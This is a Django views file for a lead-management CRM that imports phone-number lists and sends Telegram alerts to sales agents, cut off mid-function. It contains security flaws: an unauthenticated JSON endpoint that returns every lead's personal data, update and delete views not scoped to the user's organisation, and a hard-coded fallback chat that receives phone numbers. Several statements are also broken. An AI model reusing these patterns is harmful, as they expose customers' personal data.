import logging
import datetime
from typing import Any
from django.contrib import messages
from django.core.mail import send_mail
from django.http.response import JsonResponse
from django.shortcuts import render, redirect, reverse, get_object_or_404
from django.contrib.auth.mixins import LoginRequiredMixin
from django.http import HttpResponse
from django.views import generic, View
from agents.mixins import OrganisorAndLoginRequiredMixin
from .models import (Lead, 
                     Agent, 
                     Category, 
                     FollowUp, 
                     BankNumbers, 
                     User, 
                     Sale,
                     DuplicateToFollow,
                     Source,
                     Team,
                     ChatSetting,
                     UserProfile)
from .forms import (LeadModelForm,
                    CustomUserCreationForm,
                    AssignAgentForm,
                    LeadCategoryUpdateForm,
                    CategoryModelForm,
                    FollowUpModelForm,
                    FormatForm,
                    LeadImportForm,
                    BankImportForm,
                    BankModelForm,
                    DistributionForm,
                    CategorySelectionForm,
                    ConfirmationForm,
                    LeadSearchForm,
                    SaleModelForm,
                    SourceModelForm,
                    TeamModelForm,
                    ChatOverrideForm,
                    UserUpdateForm,
                    PasswordChangeForm,
                    LeadImportFormAgents,
)
from .resources import LeadResource, BankResource
import csv
from django.db.models import Sum, Count
from datetime import timedelta, date, datetime
from django.db.models.functions import Length
import pandas as pd
import random
from formtools.wizard.views import SessionWizardView
from django.utils.datastructures import MultiValueDictKeyError
from django.utils import timezone
from .filters import LeadFilter
from django.urls import reverse_lazy
from django.forms import modelformset_factory
from chartjs.views.lines import BaseLineChartView
from dateutil.relativedelta import relativedelta
from extensions.utils import jalali_converter
import jdatetime
from telegram import Bot
import asyncio
from aiolimiter import AsyncLimiter
from background_task import background
import json
import requests
from django.conf import settings
from asgiref.sync import sync_to_async
from persiantools.jdatetime import JalaliDate
import os
import uuid
import khayyam
from django.utils.translation import gettext as _
import subprocess
import sys
import signal
from django.core.cache import cache
import telegram
from concurrent.futures import ThreadPoolExecutor
from django.contrib.auth import update_session_auth_hash
from django.db import IntegrityError


# logger = logging.getLogger(__name__)

# CRUD+L - Create, Retrieve, Update and Delete + List

class SignupView(generic.CreateView):
    template_name = "registration/signup.html"
    form_class = CustomUserCreationForm

    def get_success_url(self):
        return reverse("login")

class LandingPageView(generic.TemplateView):
    template_name = "landing.html"

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect("dashboard")
        return super().dispatch(request, *args, **kwargs)

class DashboardView(OrganisorAndLoginRequiredMixin, generic.TemplateView):
    template_name = "dashboard.html"

    def get_context_data(self, **kwargs):
        context = super(DashboardView, self).get_context_data(**kwargs)

        user = self.request.user

        # How many leads we have in total
        total_lead_count = Lead.objects.filter(organisation=user.userprofile).count()

        # How many new leads in the last 30 days
        thirty_days_ago = date.today() - timedelta(days=30)

        total_in_past30 = Lead.objects.filter(
            organisation=user.userprofile, date_added__gte=thirty_days_ago
        ).count()

        # How many converted leads in the last 30 days
        converted_category = Category.objects.get(name="Converted")
        converted_in_past30 = Lead.objects.filter(
            organisation=user.userprofile,
            category=converted_category,
            converted_date__gte=thirty_days_ago,
        ).count()

        context.update(
            {
                "total_lead_count": total_lead_count,
                "total_in_past30": total_in_past30,
                "converted_in_past30": converted_in_past30,
            }
        )
        return context

def landing_page(request):
    return render(request, "landing.html")

class BankListView(OrganisorAndLoginRequiredMixin, generic.ListView):
    template_name = "leads/bank_list.html"
    context_object_name = "bank"
    paginate_by = 10

    def get_queryset(self):
        user = self.request.user
        
        if user.is_organisor:
            queryset = BankNumbers.objects.filter(organisation=user.userprofile).order_by('date_added')

        return queryset
    
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        user = self.request.user
        total_bank_numbers = BankNumbers.objects.all().count()
        bank_list = BankNumbers.objects.filter(organisation=user.userprofile).order_by('date_added')
        context["bank_numbers"] = {
            'bank_total': total_bank_numbers if total_bank_numbers else 0,
            'bank_list': bank_list if bank_list else _('Empty')
        }

        return context

def bank_list(request):
    user = request.user
    bank_n = BankNumbers.objects.filter(organisation=user.userprofile).sort_by

    context = {'bank_n': bank_n}
    return render(request, "leads/bank_list.html", context)
    
class BankCreateView(OrganisorAndLoginRequiredMixin, generic.CreateView):
    template_name = "leads/bank_create.html"
    form_class = BankModelForm

    def get_success_url(self):
        return reverse("leads:bank-list")

    def form_valid(self, form):
        user = self.request.user
        if BankNumbers.objects.filter(organisation=user.userprofile, number=form.cleaned_data["number"]).exists() == False:
            bank = form.save(commit=False)
            bank.organisation = self.request.user.userprofile
            bank.save()
            
            messages.success(self.request, _("New Bank Number Created"))
            return super(BankCreateView, self).form_valid(form)
        else: 
            messages.error(self.request, _("Bank Number already exists"))
            return redirect("leads:bank-list")

def bank_create(request):
    form = BankModelForm()
    if request.method == "POST":
        form = BankModelForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect("/bank")
    context = {"form": form}
    return render(request, "leads/bank_create.html", context)

class LeadListView(LoginRequiredMixin, generic.ListView):
    template_name = "leads/lead_list.html"
    context_object_name = "leads"
    paginate_by = 15
    
    def get_queryset(self):
        user = self.request.user
        
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Lead.objects.filter(organisation=user.userprofile).order_by('-date_assigned')
        else:
            queryset = Lead.objects.filter(
                organisation=user.agent.organisation, agent__isnull=False
            ).order_by('-date_assigned')
            # filter for the agent that is logged in
            queryset = queryset.filter(agent__user=user)

        filter_date = self.request.GET.get('filter_date', None)
        if filter_date == 'yesterday':
            queryset = queryset.filter(date_assigned__date=date.today() - timedelta(days=1))
        elif filter_date == 'day_before':
            queryset = queryset.filter(date_assigned__date=date.today() - timedelta(days=2))
        elif filter_date == 'today':
            queryset = queryset.filter(date_assigned__date=date.today())
        elif filter_date == 'all':
            queryset = queryset

        # Handling the search query
        query = self.request.GET.get('query', None)
        if query:
            queryset = queryset.filter(phone_number__icontains=query).order_by('-date_assigned')

        # IMPORTANT: Always set the filterset regardless of the branch
        self.filterset = LeadFilter(self.request.GET, queryset=queryset)
        return self.filterset.qs.order_by('-date_assigned')
            
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        user = self.request.user
        if user.is_organisor:
            queryset = Lead.objects.filter(
                organisation=user.userprofile, agent__isnull=True
            ).order_by('-date_assigned')
            context["unassigned_leads"] = queryset

        # Convert 'yesterday' and 'day before yesterday' to Jalali
        gregorian_yesterday = date.today() - timedelta(days=1)
        gregorian_day_before = date.today() - timedelta(days=2)
        
        jalali_yesterday = jdatetime.date.fromgregorian(date=gregorian_yesterday)
        jalali_day_before = jdatetime.date.fromgregorian(date=gregorian_day_before)
        
        # Pass these dates to context
        context["jalali_yesterday"] = jalali_yesterday.strftime('%Y/%m/%d')
        context["jalali_day_before"] = jalali_day_before.strftime('%Y/%m/%d')

        # Add the search form
        context["search_form"] = LeadSearchForm(self.request.GET or None)

        context["filter_form"] = self.filterset.form

        
        return context

def lead_list(request):
    leads = Lead.objects.all().sort_by

    context = {'leads': leads}
    return render(request, "leads/lead_list.html", context)

class LeadDetailView(LoginRequiredMixin, generic.DetailView):
    template_name = "leads/lead_detail.html"
    context_object_name = "lead"

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Lead.objects.filter(organisation=user.userprofile)
        else:
            queryset = Lead.objects.filter(organisation=user.agent.organisation)
            # filter for the agent that is logged in
            queryset = queryset.filter(agent__user=user)
        return queryset

def lead_detail(request, pk):
    lead = Lead.objects.get(id=pk)
    context = {"lead": lead}
    return render(request, "leads/lead_detail.html", context)

class LeadCreateView(OrganisorAndLoginRequiredMixin, generic.CreateView):
    template_name = "leads/lead_create.html"
    form_class = LeadModelForm

    def get_success_url(self):
        return reverse("leads:lead-list")
    
    def get_form_kwargs(self):
        kwargs = super(LeadCreateView, self).get_form_kwargs()
        kwargs.update({'user': self.request.user})  # Pass user to the form
        return kwargs

    def form_valid(self, form):
        user = self.request.user
        try:
            if BankNumbers.objects.filter(organisation=user.userprofile, number=form.cleaned_data["phone_number"]).exists() == False or BankNumbers.objects.filter(organisation=user.userprofile, agent__user__first_name='Bank', number=form.cleaned_data["phone_number"]).exists() == False:
                lead = form.save(commit=False)
                lead.organisation = self.request.user.userprofile
                lead.save()
                send_mail(
                    subject="A lead has been created",
                    message="Go to the site to see the new lead",
                    from_email="test@test.com",
                    recipient_list=["test2@test.com"],
                )
                messages.success(self.request, _("You have successfully created a lead"))
                return super(LeadCreateView, self).form_valid(form)
            
            else: 
                bank_number = BankNumbers.objects.get(organisation=user.userprofile, number=form.cleaned_data["phone_number"])
                DuplicateToFollow.objects.get_or_create(user = self.request.user, number=form.cleaned_data["phone_number"], organisation_id=self.request.user.userprofile.id, agent=bank_number.agent)
                messages.error(self.request, _("Lead already exists!"))
                return redirect("leads:lead-list")
        except IntegrityError:
            messages.error(self.request, _("Lead with this phone number already exists for your organisation."))
            return redirect("leads:lead-list")

def lead_create(request):
    form = LeadModelForm()
    if request.method == "POST":
        form = LeadModelForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect("/leads")
    context = {"form": form}
    return render(request, "leads/lead_create.html", context)

class LeadUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
    
    template_name = "leads/lead_update.html"
    form_class = LeadModelForm
    
    def get_queryset(self):
        user = self.request.user

        if user.is_organisor:
                queryset = Lead.objects.filter(organisation=user.userprofile)
        else:
            queryset = Lead.objects.filter(
                organisation=user.agent.organisation
                )
            queryset = queryset.filter(agent__user=user)
        return queryset

    def get_form_kwargs(self):
        kwargs = super(LeadUpdateView, self).get_form_kwargs()
        kwargs.update({"user": self.request.user})  # Add user to form kwargs
        return kwargs
    
    def get_success_url(self):
        return reverse("leads:lead-list")

    def form_valid(self, form):
        user = self.request.user
        if not form.is_valid():
            print(form.errors)
        # Before saving, capture the original agent
        original_agent = self.get_object().agent

        # Save the updated lead instance
        response = super(LeadUpdateView, self).form_valid(form)

        # Check if agent has changed
        if original_agent != self.object.agent:
            new_agent = self.object.agent
            print(f"Agent was changed to: {new_agent}")

            # If the new agent has a chat_id, send a notification
            if new_agent:
                message = f"{self.object.phone_number}, {self.object.category}"
                if new_agent.chat_id:
                    chat_id = new_agent.chat_id
                else:
                    chat_id = '-1001707390535'

                notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)

        messages.info(self.request, _("You have successfully updated this lead"))

        return response

def lead_update(request, pk):
    lead = Lead.objects.get(id=pk)
    form = LeadModelForm(instance=lead)
    if request.method == "POST":
        form = LeadModelForm(request.POST, instance=lead)
        if form.is_valid():
            form.save()
            return redirect("/leads")
    context = {"form": form, "lead": lead}
    return render(request, "leads/lead_update.html", context)

class LeadDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
    template_name = "leads/lead_delete.html"

    def get_success_url(self):
        return reverse("leads:lead-list")

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        return Lead.objects.filter(organisation=user.userprofile)

def lead_delete(request, pk):
    lead = Lead.objects.get(id=pk)
    lead.delete()
    return redirect("/leads")

class AssignAgentView(OrganisorAndLoginRequiredMixin, generic.FormView):
    template_name = "leads/assign_agent.html"
    form_class = AssignAgentForm

    def get_form_kwargs(self, **kwargs):
        kwargs = super(AssignAgentView, self).get_form_kwargs(**kwargs)
        kwargs.update({"request": self.request})
        return kwargs

    def get_success_url(self):
        return reverse("leads:lead-list")

    def form_valid(self, form):
        agent = form.cleaned_data["agent"]
        lead = Lead.objects.get(id=self.kwargs["pk"])
        lead.agent = agent
        lead.save()
        return super(AssignAgentView, self).form_valid(form)

class CategoryListView(LoginRequiredMixin, generic.ListView):
    template_name = "leads/category_list.html"
    context_object_name = "category_list"

    def get_context_data(self, **kwargs):
        context = super(CategoryListView, self).get_context_data(**kwargs)
        user = self.request.user

        if user.is_organisor:
            queryset = Lead.objects.filter(organisation=user.userprofile)
        else:
            queryset = Lead.objects.filter(organisation=user.agent.organisation)

        context.update(
            {"unassigned_lead_count": queryset.filter(agent__isnull=True).count()}
        )
        return context

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Category.objects.filter(organisation=user.userprofile)
            queryset = queryset.annotate(lead_count=Count('leads')).values('pk', 'name', 'lead_count')

        else:
            queryset = Category.objects.filter(organisation=user.agent.organisation)
            queryset = queryset.annotate(lead_count=Count('leads')).values('pk', 'name', 'lead_count')

        return queryset

class CategoryDetailView(LoginRequiredMixin, generic.DetailView):
    template_name = "leads/category_detail.html"
    context_object_name = "category"

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Category.objects.filter(organisation=user.userprofile)
        else:
            queryset = Category.objects.filter(organisation=user.agent.organisation)
        return queryset

class CategoryCreateView(OrganisorAndLoginRequiredMixin, generic.CreateView):
    template_name = "leads/category_create.html"
    form_class = CategoryModelForm

    def get_success_url(self):
        return reverse("leads:category-list")

    def form_valid(self, form):
        category = form.save(commit=False)
        category.organisation = self.request.user.userprofile
        category.save()
        return super(CategoryCreateView, self).form_valid(form)

class CategoryUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
    template_name = "leads/category_update.html"
    form_class = CategoryModelForm

    def get_success_url(self):
        return reverse("leads:category-list")

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Category.objects.filter(organisation=user.userprofile)
        else:
            queryset = Category.objects.filter(organisation=user.agent.organisation)
        return queryset

class CategoryDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
    template_name = "leads/category_delete.html"

    def get_success_url(self):
        return reverse("leads:category-list")

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Category.objects.filter(organisation=user.userprofile)
        else:
            queryset = Category.objects.filter(organisation=user.agent.organisation)
        return queryset

class LeadCategoryUpdateView(LoginRequiredMixin, generic.UpdateView):
    template_name = "leads/lead_category_update.html"
    form_class = LeadCategoryUpdateForm

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = Lead.objects.filter(organisation=user.userprofile)
        else:
            queryset = Lead.objects.filter(organisation=user.agent.organisation)
            # filter for the agent that is logged in
            queryset = queryset.filter(agent__user=user)
        return queryset

    def get_success_url(self):
        return reverse("leads:lead-detail", kwargs={"pk": self.get_object().id})

    def form_valid(self, form):
        lead_before_update = self.get_object()
        instance = form.save(commit=False)
        converted_category = Category.objects.get(name="Converted")
        if form.cleaned_data["category"] == converted_category:
            # update the date at which this lead was converted
            if lead_before_update.category != converted_category:
                # this lead has now been converted
                instance.converted_date = datetime.datetime.now()
        instance.save()
        return super(LeadCategoryUpdateView, self).form_valid(form)

class FollowUpCreateView(LoginRequiredMixin, generic.CreateView):
    template_name = "leads/followup_create.html"
    form_class = FollowUpModelForm

    def get_success_url(self):
        return reverse("leads:lead-detail", kwargs={"pk": self.kwargs["pk"]})

    def get_context_data(self, **kwargs):
        context = super(FollowUpCreateView, self).get_context_data(**kwargs)
        context.update({"lead": Lead.objects.get(pk=self.kwargs["pk"])})
        return context

    def form_valid(self, form):
        lead = Lead.objects.get(pk=self.kwargs["pk"])
        followup = form.save(commit=False)
        followup.lead = lead
        followup.save()
        return super(FollowUpCreateView, self).form_valid(form)

class FollowUpUpdateView(LoginRequiredMixin, generic.UpdateView):
    template_name = "leads/followup_update.html"
    form_class = FollowUpModelForm

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = FollowUp.objects.filter(lead__organisation=user.userprofile)
        else:
            queryset = FollowUp.objects.filter(
                lead__organisation=user.agent.organisation
            )
            # filter for the agent that is logged in
            queryset = queryset.filter(lead__agent__user=user)
        return queryset

    def get_success_url(self):
        return reverse("leads:lead-detail", kwargs={"pk": self.get_object().lead.id})

class FollowUpDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
    template_name = "leads/followup_delete.html"

    def get_success_url(self):
        followup = FollowUp.objects.get(id=self.kwargs["pk"])
        return reverse("leads:lead-detail", kwargs={"pk": followup.lead.pk})

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        if user.is_organisor:
            queryset = FollowUp.objects.filter(lead__organisation=user.userprofile)
        else:
            queryset = FollowUp.objects.filter(
                lead__organisation=user.agent.organisation
            )
            # filter for the agent that is logged in
            queryset = queryset.filter(lead__agent__user=user)
        return queryset

class LeadJsonView(generic.View):
    def get(self, request, *args, **kwargs):
        qs = list(Lead.objects.all().values("first_name", "last_name", "age"))

        return JsonResponse(
            {
                "qs": qs,
            }
        )

class LeadExportView(OrganisorAndLoginRequiredMixin, generic.ListView, generic.FormView):
    template_name = "leads/lead_export.html"
    context_object_name = "leads"
    model = Lead
    form_class = FormatForm

    def post(self, request, **kwargs):
        user = self.request.user
        leads = Lead.objects.filter(organisation=user.userprofile)
        qs = self.get_queryset()
        dataset = LeadResource().export(qs)

        format = request.POST.get("format")

        if format == "xls":
            ds = dataset.xls

        elif format == "csv":
            ds = dataset.csv

        else:
            ds = dataset.json

        response = HttpResponse(ds, content_type=f"{format}")
        response["Content-Disposition"] = f"attachment; filename=leads.{format}"
        return response

    def get_success_url(self):
        return reverse("leads:lead-list")

class BankExportView(OrganisorAndLoginRequiredMixin, generic.ListView, generic.FormView):
    template_name = "leads/bank_export.html"
    
    context_object_name = "bank_numbers"
    model = BankNumbers
    form_class = FormatForm

    def post(self, request, **kwargs):
        user = self.request.user
        leads = BankNumbers.objects.filter(organisation=user.userprofile)
        qs = self.get_queryset()
        dataset = BankResource().export(qs)

        format = request.POST.get("format")

        if format == "xls":
            ds = dataset.xls

        elif format == "csv":
            ds = dataset.csv

        else:
            ds = dataset.json

        response = HttpResponse(ds, content_type=f"{format}")
        response["Content-Disposition"] = f"attachment; filename=leads.{format}"
        return response
    
    def get_queryset(self):
        user = self.request.user
        
        if user.is_organisor:
            queryset = BankNumbers.objects.filter(organisation=user.userprofile).order_by('date_added')

        return queryset

    def get_success_url(self):
        return reverse("leads:bank-list")

def preprocess_csv_numbers(csv_file):
    """
    Preprocess a list of phone numbers from a CSV file:
    - Remove whitespace
    - Replace '+' with '00'
    - Remove '(' and ')'
    - Ensure valid numbers start with '0' or '00'
    """
    # Read the CSV file into a list
    df = pd.read_csv(csv_file, header=None, dtype=str)
    numbers = df[0].tolist()

    processed_numbers = []
    
    for num in numbers:
        # Remove whitespace and replace special characters
        cleaned_num = num.replace(' ', '').replace('+', '00').replace('(', '').replace(')', '')
        
        # Ensure valid numbers start with '0' or '00'
        if cleaned_num[0] == '9' and len(cleaned_num) == 10:
            cleaned_num = '0' + cleaned_num
        
        processed_numbers.append(cleaned_num)

    return list(set(processed_numbers))  # Remove duplicates and return

def get_user_profile(organisation_id):
    return UserProfile.objects.get(id=organisation_id)

@background(schedule=1)
def notify_background_messages(chat_id, message, organisation_id):
    asyncio.run(send_telegram_message(chat_id, message, organisation_id))

async def send_telegram_message(chat_id, message, organisation_id):
    limiter = AsyncLimiter(1, 30)

    # Wrap the entire get operation inside sync_to_async
    user_profile = await sync_to_async(UserProfile.objects.get)(id=organisation_id)
    TOKEN = user_profile.telegram_token
    bot = Bot(TOKEN)

    try:
        await limiter.acquire()
        await bot.send_message(chat_id=chat_id, text=message)
    except (telegram.error.BadRequest, Exception) as e:
        print(f"Error sending Telegram message to {chat_id}: {e}")

        # Try sending to the backup chat_id
        try:
            await bot.send_message(chat_id='-1001707390535', text=message)
        except Exception as backup_error:
            print(f"Error sending Telegram message to backup chat: {backup_error}")

class LeadImportView(OrganisorAndLoginRequiredMixin, View):
    template_name = 'leads/lead_import.html'

    def get(self, request):
        if 'override_chat_id' not in request.session:
            return render(request, 'leads/prompt_override_chat_id.html')
       
        form = LeadImportForm(user=request.user)
        return render(request, self.template_name, {'form': form})

    def lead_preprocess(self, csv_file):
        # Convert the CSV reader to a list
        all_numbers = csv_file
        all_numbers = [item[0] for item in all_numbers if len(item) > 0]
        
        for number in all_numbers:
            number.replace(' ', '')
            number.replace('+', '00')
            number.replace('(', '')
            number.replace(')', '')

        # Remove duplicates
        all_numbers = list(set(all_numbers))  


        return all_numbers

    def post(self, request):

        if 'choice' in request.POST:
            if request.POST['choice'] == "Yes":
                request.session['override_chat_id'] = True
            else:
                request.session['override_chat_id'] = False
            return redirect('leads:lead-import')
        
        
        chat_id = '-1001707390535'  # Default value 
        form = LeadImportForm(request.POST, request.FILES, user=request.user)
        user = self.request.user
        TOKEN = user.userprofile.telegram_token
        bot = Bot(TOKEN)
        if form.is_valid():
            csv_file = form.cleaned_data['csv_file']
            source = form.cleaned_data['source']
            try:
                csv_file = pd.read_csv(csv_file, header=None, dtype=str).values.tolist()
                total_leads = 0
                duplicates = 0
                added_leads = 0
                foreign_added = 0
                all_numbers = self.lead_preprocess(csv_file)
                for number in all_numbers:
                    print(number)
                    total_leads += 1
                    category = form.cleaned_data['category']
                    if BankNumbers.objects.filter(organisation=user.userprofile, number=number).exists():
                        duplicates += 1
                        bank_number = BankNumbers.objects.get(organisation=user.userprofile, number=number)
                        # if bank_number.agent.user.first_name == 'BANK' and not Lead.objects.filter(organisation=user.userprofile, phone_number=number):
                        #     if len(number) == 11:
                        #         added_leads += 1
                        #         Lead.objects.get_or_create(phone_number=number, category=category, source=source, organisation=user.userprofile)
                        #     else:
                        #         foreign_added += 1
                        #         category, created = Category.objects.get_or_create(name='خارجی', organisation=user.userprofile)
                        #         Lead.objects.get_or_create(phone_number=number, category=category, source=source, organisation=user.userprofile)
                        # else:
                        DuplicateToFollow.objects.get_or_create(number=number, organisation=user.userprofile, agent=bank_number.agent)
                        if request.session.get('override_chat_id', False):
                            chat_id = '-1001707390535'
                        else:
                            chat_id = bank_number.agent.chat_id if bank_number.agent.chat_id else '-1001707390535'
                        message = f'تماس {number} {bank_number.agent}'
                        # notify_background_messages_celery.delay(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
                        notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
                    elif Lead.objects.filter(organisation=user.userprofile, phone_number=number).exists():
                        duplicates += 1
                        lead = Lead.objects.get(organisation=user.userprofile, phone_number=number)
                        DuplicateToFollow.objects.get_or_create(number=number, organisation=user.userprofile, agent=lead.agent)
                        if lead.agent:
                            if request.session.get('override_chat_id', False):
                                chat_id = '-1001707390535'
                            else:
                                chat_id = lead.agent.chat_id if lead.agent.chat_id else '-1001707390535'
                            message = f'تماس {number} {lead.agent}'
                            # notify_background_messages_celery.delay(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
                            notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
                        else:
                            message = f'شماره تکراری بدون کارشناس: {number}'
                            notify_background_messages(chat_id='-1001707390535', message=message, organisation_id=user.userprofile.id)
                    else:
                        if len(number) == 11:
                            added_leads += 1
                            Lead.objects.create(phone_number=number, category=category, source=source, organisation=user.userprofile)
                        else:
                            foreign_added += 1
                            category, created = Category.objects.get_or_create(name='خارجی', organisation=user.userprofile)
                            Lead.objects.create(phone_number=number, category=category, source=source, organisation=user.userprofile)

                   

                # Send a message to Telegram
                if request.session.get('override_chat_id', False):
                    chat_id = '-1001707390535'
                else:
                    chat_id = user.userprofile.chat_id if user.userprofile.chat_id else '-1001707390535'
                

                message = f'''
                منبع: {source}\n
                نوع: {category}\n
                تعداد شماره‌های ورودی: {total_leads}\n
                تعداد شماره‌های تکراری: {duplicates}\n
                تعداد شماره‌های خالص خارجی: {foreign_added}\n
                تعدادشماره‌‌های خالص ایرانی: {added_leads}\n\n\n

'''

                
                # notify_background_messages_celery.delay(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)
                notify_background_messages(chat_id=chat_id, message=message, organisation_id=user.userprofile.id)


                return redirect("leads:lead-list")
            except Exception as e:
                print(e)
                # Catch any error related to file processing and display a message to the user
                messages.error(request, f'''An error occurred while processing the file. Review the file and upload again.
                                            THE FILE SHOULD HAVE ONE COLUMN OF ONLY NUMBERS!''')
                
        if 'override_chat_id' in request.session:
            del request.session['override_chat_id']

        return render(request, self.template_name, {'form': form})

class BankImportView(OrganisorAndLoginRequiredMixin, View):
    template_name = 'leads/bank_import.html'

    def get(self, request):
        form = BankImportForm(user=request.user)
        return render(request, self.template_name, {'form': form})
        

    def post(self, request):
        form = BankImportForm(request.POST, request.FILES, user=request.user)
        user = request.user.userprofile.id
        

        if form.is_valid():
            csv_file = form.cleaned_data['csv_file']
            agent = form.cleaned_data['agent']
            decoded_file = csv_file.read().decode('utf-8').splitlines()

            # Convert the CSV reader to a list
            all_numbers = list(csv.reader(decoded_file))

            # Flatten the list if your CSV has a single column, otherwise adjust accordingly
            all_numbers = [item[0] for item in all_numbers]

            # Apply the preprocessing
            all_numbers = [string.replace(' ', '') for string in all_numbers]
            all_numbers = [string.replace('+', '00') for string in all_numbers]
            all_numbers = [string.replace('(', '') for string in all_numbers]
            all_numbers = [string.replace(')', '') for string in all_numbers]

            # Remove duplicates
            all_numbers = list(set(all_numbers))

            # Update phone numbers
            updated_phone_numbers = []
            for num in all_numbers:
                if num[0] == '0':
                    updated_phone_numbers.append(num)
                elif num[0] == '9' and len(num) == 10:
                    updated_phone_numbers.append('0' + num)
                else:
                    updated_phone_numbers.append('00' + num)
            
            all_numbers = updated_phone_numbers

            for number in all_numbers:
                if BankNumbers.objects.filter(number=number).exists():
                    continue
                else:
                    BankNumbers.objects.create(number=number, organisation_id=user, agent = agent)
            
            return redirect("leads:bank-list")

        return render(request, self.template_name, {'form': form})    

class LeadImportAgentsView(OrganisorAndLoginRequiredMixin, View):
    template_name = 'leads/lead_import_agents.html'

    def get(self, request):
        if 'override_chat_id' not in request.session:
            return render(request, 'leads/prompt_override_chat_id.html')
        form = LeadImportFormAgents(user=request.user)
        return render(request, self.template_name, {'form': form})

    def post(self, request):
        form = LeadImportFormAgents(request.POST, request.FILES, user=request.user)
        user = request.user
        
        if 'choice' in request.POST:
            if request.POST['choice'] == "Yes":
                request.session['override_chat_id'] = True
            else:
                request.session['override_chat_id'] = False
            return redirect('leads:lead-import-agents')

        if form.is_valid():
            csv_file = form.cleaned_data['csv_file']
            source = form.cleaned_data['source']
            category = form.cleaned_data['category']
            agent = form.cleaned_data['agent']  # Extracting the agent from form

            all_numbers = preprocess_csv_numbers(csv_file)
            

            for number in all_numbers:
                Lead.objects.get_or_create(phone_number=number, category=category, source=source, agent=agent, organisation=user.userprofile)

            return redirect("leads:lead-list")

        return render(request, self.template_name, {'form': form})

class BankUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
    model = BankNumbers
    form_class = BankModelForm
    template_name = 'leads/bank_update.html'  # Modify this to the path of your template
    success_url = reverse_lazy('leads:bank-list')  # Modify this to the URL or view name you want to redirect to upon successful update

    def get_object(self, queryset=None):
        """Retrieve the BankNumbers instance to be updated. You can customize this if needed."""
        return super().get_object(queryset=queryset)

    def form_valid(self, form):
        messages.success(self.request, _("Bank number updated successfully!"))
        return super().form_valid(form)

    def form_invalid(self, form):
        messages.error(self.request, _("Error updating the bank number. Please check your details."))
        return super().form_invalid(form)
    
class BankDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
    model = BankNumbers
    template_name = 'leads/bank_delete.html'  # This will be a confirmation template
    success_url = reverse_lazy('leads:bank-list')  # Modify this to the URL or view name you want to redirect to after deletion

    def delete(self, request, *args, **kwargs):
        messages.success(request, _("Bank number deleted successfully!"))
        return super().delete(request, *args, **kwargs)
    
FORMS = [
    ("chat_override", ChatOverrideForm),
    ("category", CategorySelectionForm),
    ("distribution_info", DistributionForm),
    ("confirm", ConfirmationForm),  # No form for confirmation, just an action button.
]

executor = ThreadPoolExecutor()
async def load_chat_settings():
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(executor, ChatSetting.load)

def create_agent_message(agent_name, rank, phone_data):
    today = jdatetime.datetime.now().strftime('%Y/%m/%d')
    if rank == 1:
        medal = "🥇"
    elif rank == 2:
        medal = "🥈"
    elif rank == 3:
        medal = "🥉"
    elif rank == 4:
        medal = "🏅"
        rank = "آموزش"
    else:
        return None  # Handle ranks outside of 1-4 if necessary

    message = f'''
        {medal}
        {today} 

        {agent_name}
        رنک : {rank}
        ارجاع : {len(phone_data.values())}\n\n'''

    for i, lead_details in enumerate(phone_data.values()):
        message += f"{i + 1}. {lead_details['phone_number']} \n"

    return message

def download_excel_page(request):
    excel_file_path = request.session.get('excel_file_path')
    return render(request, 'leads/download_excel_page.html', {'excel_file_path': excel_file_path})

class LeadDistributionWizard(SessionWizardView):
    form_list = FORMS
    template_name = 'leads/wizard.html'

    def get(self, request, *args, **kwargs):
        self.storage.extra_data['user_id'] = self.request.user.id
        print("Inside GET: user_id set in storage:", self.storage.extra_data.get('user_id'))
        return super().get(request, *args, **kwargs)
    
    def post(self, request, *args, **kwargs):
        self.storage.extra_data['user_id'] = self.request.user.id
        return super().post(request, *args, **kwargs)

    
    def get_form_kwargs(self, step='category'):
        kwargs = super().get_form_kwargs(step)
        kwargs['wizard_storage'] = self.storage  # Pass the entire storage object
        print("Inside get_form_kwargs: user_id from storage:", self.storage.extra_data.get('user_id'))
        return kwargs
    
    def get_form(self, step=None, data=None, files=None):
        form = super().get_form(step, data, files)

        # if step == 'chat_override':
        #     self.storage.extra_data['user_id'] = self.request.user.id

        if step == 'category':
            # self.storage.extra_data['user_id'] = self.request.user.id
            print(self.request.session.items())
        
        # Handle the data passing for the form. For example, if you need the category ID for the 'distribution_info' form
        if step == 'distribution_info' and data:
            try:
                category = Category.objects.get(pk=data.get('category'))
                alternate_category = Category.objects.get(pk=data.get('alternate_category'))

                form.initial = {
                    'category': category,
                    'alternate_category': alternate_category
                    }
            except (MultiValueDictKeyError, Category.DoesNotExist):
                pass
        if step == 'chat_override' and data: 
